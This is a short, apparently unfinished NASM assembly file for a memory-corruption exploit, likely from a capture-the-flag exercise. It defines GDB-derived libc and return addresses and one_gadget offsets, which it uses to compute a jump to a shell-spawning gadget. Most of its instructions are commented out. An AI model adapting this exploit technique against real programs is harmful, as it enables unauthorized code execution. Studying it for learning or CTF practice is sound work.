[bits 64]
[org 0x0]

SECOND_MAIN equ 0x40086d
LIBC_BASE_GDB equ   0x7ffff7a0d000
RETURN_ADDR_GDB equ 0x7ffff7a575d0
;ONE_GADGET_OFFSET equ 0x45216
ONE_GADGET_OFFSET equ 0x4526a
; one_gadget_addr may be smaller than return_addr
DIFF equ (RETURN_ADDR_GDB-LIBC_BASE_GDB-ONE_GADGET_OFFSET)
POP_TIMES_TO_SHELLCODE_ADDR equ 24

entry:
  ;pop rax
  ;times DIFF inc rax
  ;inc rax
  ;rol rax, 1
  shl rax, 1
  ;dec rax
  ;call rax

line_feed:
  ;db 0x0a
